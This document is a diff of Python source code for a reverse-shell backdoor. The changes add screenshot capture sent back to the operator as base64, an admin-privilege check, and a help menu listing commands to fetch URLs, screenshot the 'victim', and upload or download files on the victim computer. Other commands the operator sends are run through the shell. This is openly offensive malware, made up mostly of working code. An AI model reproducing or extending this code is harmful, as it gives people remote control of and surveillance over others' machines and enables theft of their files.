@@ -2,6 +2,7 @@
 
 import socket,subprocess,sys,os
 import base64,time,requests
+from mss import mss
 import json,shutil
 
 def reliable_recv():
@@ -33,13 +34,36 @@ def connection():
         except Exception as err:
             connection()
 
+def screenshot():
+    with mss() as screenshot:
+        screenshot.shot()
+
+def is_admin():
+    global admin
+    try:
+        temp = os.listdir(os.sep.join([os.environ.get("SystemRoot","c:\windows"),'temp']))
+    except:
+        admin = "[!!] User Priviledges"
+    else:
+        admin = "[!!] Admin Privledges"
+
+
 def shell():
     while True:
-        command = sock.recv(1024).decode("utf-8")
+        command = reliable_recv()
         print("cmd -> "+command)
         if command == 'q':
             sys.exit(0)
             break
+        elif command == "help":
+            message = '''
+                get path           ==>  fetch a content from given URL
+                screenshot         ==>  get a screenshot from victim Profile
+                download file_name ==>  download file name from Victim computer
+                upload file_name   ==>  upload a file to victim computer
+                check              ==>  checking user/admin privileges availability
+            '''
+            reliable_send(message)
         elif command[:2] == "cd" and len(command) > 1:
             try:
                 os.chdir(command[3:])
@@ -64,11 +88,24 @@ def shell():
                 reliable_send("[+] Download file from specific URL!")
             except:
                 reliable_send("[+] Download file from specific URL!")
-
+        elif command[:10] == "screenshot":
+            try:
+                screenshot()
+                with open("monitor-1.png","rb") as f:
+                    reliable_send(base64.b64encode(f.read()))
+                    os.remove("monitor-1.png")
+            except Exception as err:
+                reliable_send("[!!] Failed to take screenshot")
+                print(str(err))
+        elif command[:5] == "check":
+            try:
+                is_admin()
+                reliable_send(admin)
+            except:
+                reliable_send("Cant Perform the check")
         else:
             message = subprocess.check_output(command,shell=True)
-            sock.send(message)
-
+            reliable_send(message)
 
 if __name__ == "__main__":
 
